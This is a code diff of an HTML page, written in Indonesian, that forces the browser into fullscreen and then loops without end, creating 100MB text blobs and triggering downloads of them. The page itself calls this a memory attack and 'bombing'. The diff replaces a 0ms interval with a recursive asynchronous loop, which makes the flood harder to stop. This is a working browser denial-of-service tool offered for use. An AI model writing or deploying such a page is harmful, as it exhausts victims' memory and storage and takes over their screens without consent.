@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen & Infinite Spam Download (0ms x 100MB)</title>
+  <title>Auto Fullscreen & Infinite Loop Download (Async)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -21,7 +21,6 @@
       max-width: 650px;
       margin: 40px auto;
     }
-    /* Mengunci tampilan saat layar penuh */
     :fullscreen {
       background: #000000 !important;
       color: #00ff00 !important;
@@ -83,8 +82,8 @@
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Mobile Auto-Fullscreen & Instant Spam</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB setiap 0 milidetik.</p>
+    <h2>Mobile Auto-Fullscreen & Infinite Loop Spam</h2>
+    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB secara terus menerus (Async Infinite Loop).</p>
 
     <p>
       <button id="start" type="button">⚠️ LOCK FULLSCREEN & SPAM NOW ⚠️</button>
@@ -113,12 +112,12 @@
       }
     };
 
-    // Fungsi Asinkronus pembuat data 100MB
+    // Pembuat data 100MB
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
-          const sizeInBytes = 100000000; // 100 MB (100.000.000 byte)
-          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Character byte 'A'
+          const sizeInBytes = 100000000; // 100 MB
+          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Character ASCII 'A'
           const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -126,7 +125,7 @@
       });
     };
 
-    // Pemicu Unduhan Instan ke Browser
+    // Pemicu Unduhan
     const triggerInstantDownload = (fileData) => {
       const link = document.createElement("a");
       link.href = fileData.url;
@@ -136,24 +135,39 @@
       link.click();
     };
 
+    // Perulangan Tak Terbatas Secara Asynchronous
+    const runInfiniteLoop = async (fileCounter) => {
+      if (!isLooping) return;
+
+      // Buat file dan picu unduhan
+      const fileData = await prepareBlobAsync(fileCounter);
+      objectUrls.push(fileData.url);
+      triggerInstantDownload(fileData);
+
+      status.textContent = `🚨 SPAM AKTIF! File ke-${fileCounter} (Total: ${fileCounter * 100} MB)`;
+
+      if (fileCounter % 10 === 0) {
+        speakText(`Spam mencapai ${fileCounter} file.`);
+      }
+
+      // Memanggil dirinya sendiri pada iterasi berikutnya tanpa mengunci Main Thread
+      setTimeout(() => runInfiniteLoop(fileCounter + 1), 0);
+    };
+
     start.addEventListener("click", () => {
       if (isLooping) return; 
 
-      // Pembersihan total memori di awal klik
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // ==========================================
-      // TAHAP 1: FULLSCREEN
-      // ==========================================
       speakText("Layar penuh diaktifkan. Bersiap memulai serangan memori.");
       
       const docEl = document.documentElement;
       try {
         if (docEl.requestFullscreen) {
           docEl.requestFullscreen();
-        } else if (docEl.webkitRequestFullscreen) { // Chrome & Safari Mobile
+        } else if (docEl.webkitRequestFullscreen) {
           docEl.webkitRequestFullscreen();
         } else if (docEl.mozRequestFullScreen) {
           docEl.mozRequestFullScreen();
@@ -163,32 +177,12 @@
         console.warn("Gagal fullscreen:", err.message);
       }
 
-      // ==========================================
-      // TAHAP 2: SPAM DENGAN INTERVAL 0ms
-      // ==========================================
       setTimeout(() => {
         isLooping = true;
-        let fileCounter = 1;
-        
         speakText("Layar penuh terkunci. Memulai pemboman file teks sekarang.");
-
-        setInterval(async () => {
-          // Membuat berkas baru di memori
-          const fileData = await prepareBlobAsync(fileCounter);
-          objectUrls.push(fileData.url);
-          
-          // Lemparkan ke antrean unduhan browser
-          triggerInstantDownload(fileData);
-          
-          status.textContent = `🚨 SPAM AKTIF! File ke-${fileCounter} (Total: ${fileCounter * 100} MB)`;
-
-          // Suara berkala setiap kelipatan 10 unduhan
-          if (fileCounter % 10 === 0) {
-            speakText(`Spam mencapai ${fileCounter} file.`);
-          }
-
-          fileCounter++;
-        }, 0); // Ubah nilai interval menjadi 0 ms
+        
+        // Jalankan perulangan tak terbatas
+        runInfiniteLoop(1);
       }, 250);
     });
   </script>
